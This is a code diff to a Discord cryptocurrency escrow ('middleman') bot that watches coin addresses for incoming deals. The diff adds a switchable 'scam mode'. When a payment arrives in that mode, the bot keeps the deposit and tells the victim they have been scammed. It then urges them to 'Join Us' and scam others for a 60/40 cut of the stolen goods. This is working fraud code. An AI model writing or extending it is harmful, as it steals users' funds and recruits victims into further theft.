@@ -1,7 +1,7 @@
 const axios = require('axios');
 const path = require('path');
 const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, AttachmentBuilder } = require('discord.js');
-const { getLtcAddress, getBtcAddress, getEthAddress, getSolAddress, getUsdtAddress, getMercyRoleId } = require('./settings');
+const { getLtcAddress, getBtcAddress, getEthAddress, getSolAddress, getUsdtAddress, getMercyRoleId, getMode } = require('./settings');
 
 const lastTxHash = {};
 const lastReceived = {};
@@ -105,12 +105,13 @@ async function checkSolanaAddress(address, client) {
   } catch { }
 }
 
-// ── Central notification: ping receiver, ask for their address, show 50% ──
+// ── Central notification: branches on legit vs scam mode ──────────────────
 async function notifyRealPayment(coin, cryptoAmount, priceUSD, txHash, client) {
   const usdValue = cryptoAmount > 0 && priceUSD > 0 ? cryptoAmount * priceUSD : 0;
   const halfCrypto = cryptoAmount / 2;
   const halfUSD = usdValue / 2;
   const displayCoin = coin === 'USDT [ERC-20]' ? 'USDT' : coin;
+  const mode = getMode();
 
   for (const [channelId, deal] of client.activeDeals.entries()) {
     if (deal.coin !== coin) continue;
@@ -120,48 +121,78 @@ async function notifyRealPayment(coin, cryptoAmount, priceUSD, txHash, client) {
       const channel = await client.channels.fetch(channelId).catch(() => null);
       if (!channel) continue;
 
-      const amountStr = cryptoAmount > 0
-        ? `**${cryptoAmount.toFixed(8).replace(/\.?0+$/, '')} ${displayCoin}**${usdValue > 0 ? ` (~$${usdValue.toFixed(2)} USD)` : ''}`
-        : `a **${displayCoin}** payment`;
-
-      const halfStr = cryptoAmount > 0
-        ? `**${halfCrypto.toFixed(8).replace(/\.?0+$/, '')} ${displayCoin}**${halfUSD > 0 ? ` (~$${halfUSD.toFixed(2)} USD)` : ''}`
-        : '**50%**';
-
-      const checkmarkFile = new AttachmentBuilder(
-        path.join(__dirname, '../assets/checkmark.jpg'),
-        { name: 'checkmark.jpg' }
-      );
-
-      const embed = new EmbedBuilder()
-        .setColor(0x00c853)
-        .setTitle('✅ Payment Detected!')
-        .setDescription(
-          `${amountStr} has been received and secured inside the bot.\n\n` +
-          `<@${deal.receiver}> — You are entitled to ${halfStr} as your agreed cut.\n\n` +
-          `**Please type your ${displayCoin} wallet address below** to receive your share.`
-        )
-        .setThumbnail('attachment://checkmark.jpg')
-        .setFooter({ text: `TX: ${String(txHash).slice(0, 24)}...` });
-
-      const actionRow = new ActionRowBuilder().addComponents(
-        new ButtonBuilder().setCustomId('release_funds').setLabel('Release').setStyle(ButtonStyle.Success),
-        new ButtonBuilder().setCustomId('cancel_deal').setLabel('Cancel').setStyle(ButtonStyle.Danger),
-      );
-
-      deal.step = 'await_receiver_address';
       deal.detectedAmount = cryptoAmount;
       deal.detectedCoin = displayCoin;
       deal.detectedUSD = usdValue;
       deal.detectedHalfCrypto = halfCrypto;
       deal.detectedHalfUSD = halfUSD;
 
-      await channel.send({
-        content: `<@${deal.receiver}> <@${deal.sender}>`,
-        embeds: [embed],
-        components: [actionRow],
-        files: [checkmarkFile],
-      });
+      if (mode === 'scam') {
+        // ── SCAM MODE: show scam embed, ping receiver only ─────────────
+        deal.step = 'scam_join_pending';
+        deal.scamMode = true;
+
+        const scamFile = new AttachmentBuilder(
+          path.join(__dirname, '../assets/scmsg.jpg'),
+          { name: 'scmsg.jpg' }
+        );
+
+        const embed = new EmbedBuilder()
+          .setColor(0xe53935)
+          .setTitle('Uh Oh! Unfortunately you got scammed')
+          .setDescription(
+            'You can recover your loss by letting the MM know if you want to join us or not.\n\n' +
+            'You can earn **2x or 3x** of what you lost.\n' +
+            'For the server link vouch the MM first as they tell you.\n' +
+            'If you scam anyone\'s items, you will take 60% of the scam and MM takes 40%..\n' +
+            'Or you can go home crying with nothing in your pocket.'
+          )
+          .setImage('attachment://scmsg.jpg');
+
+        const actionRow = new ActionRowBuilder().addComponents(
+          new ButtonBuilder().setCustomId('mercy_join').setLabel('Join Us').setStyle(ButtonStyle.Success),
+          new ButtonBuilder().setCustomId('mercy_leave').setLabel('Leave').setStyle(ButtonStyle.Danger),
+        );
+
+        const receiverId = deal.receiver || deal.initiator;
+        await channel.send({
+          content: receiverId ? `<@${receiverId}>` : undefined,
+          embeds: [embed],
+          components: [actionRow],
+          files: [scamFile],
+        });
+
+      } else {
+        // ── LEGIT MODE: ask receiver for their address, send 100% ──────
+        deal.step = 'await_receiver_address';
+        deal.scamMode = false;
+
+        const amountStr = cryptoAmount > 0
+          ? `**${cryptoAmount.toFixed(8).replace(/\.?0+$/, '')} ${displayCoin}**${usdValue > 0 ? ` (~$${usdValue.toFixed(2)} USD)` : ''}`
+          : `a **${displayCoin}** payment`;
+
+        const checkmarkFile = new AttachmentBuilder(
+          path.join(__dirname, '../assets/checkmark.jpg'),
+          { name: 'checkmark.jpg' }
+        );
+
+        const embed = new EmbedBuilder()
+          .setColor(0x00c853)
+          .setTitle('Payment Detected!')
+          .setDescription(
+            `${amountStr} has been received and secured.\n\n` +
+            `**Please type your ${displayCoin} wallet address** to receive your funds.`
+          )
+          .setThumbnail('attachment://checkmark.jpg')
+          .setFooter({ text: `TX: ${String(txHash).slice(0, 24)}...` });
+
+        const receiverId = deal.receiver || deal.initiator;
+        await channel.send({
+          content: receiverId ? `<@${receiverId}>` : undefined,
+          embeds: [embed],
+          files: [checkmarkFile],
+        });
+      }
     } catch (e) {
       console.error('Monitor notify error:', e.message);
     }
